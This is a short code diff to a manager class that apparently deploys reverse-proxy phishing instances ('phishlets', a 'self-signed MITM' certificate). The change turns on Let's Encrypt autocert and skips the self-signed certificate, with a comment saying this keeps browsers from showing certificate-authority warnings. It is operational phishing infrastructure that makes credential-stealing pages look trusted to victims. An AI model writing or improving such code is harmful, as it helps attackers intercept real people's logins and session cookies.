@@ -323,7 +323,7 @@ class InstanceManager:
         https_port = int(os.environ.get("AGENT_HTTPS_PORT", payload.get("https_port", 443)))
         dns_port = int(payload["dns_port"]) if payload.get("dns_port") else int(os.environ.get("AGENT_DNS_PORT", "5302"))
         config_dir = Path(payload["config_dir"])
-        autocert = False  # Let's Encrypt (autocert) can't validate in this fork; use self-signed MITM
+        autocert = self._default_autocert()  # Let's Encrypt trusted certs (browsers, no ERR_CERT_AUTHORITY_INVALID)
         external_ip = payload.get("external_ipv4") or self.settings.external_ip or "127.0.0.1"
 
         write_config(config_dir, base_domain, phishlet_hostname, phishlet_name,
@@ -335,7 +335,8 @@ class InstanceManager:
         parts = base_domain.split(".")
         root_domain = ".".join(parts[-2:]) if len(parts) >= 3 else base_domain
 
-        _gen_self_signed_cert(config_dir, phishlet_hostname)
+        if not autocert:
+            _gen_self_signed_cert(config_dir, phishlet_hostname)
 
         proc = self._spawn(config_dir, phishlet_hostname, log_dir)
 
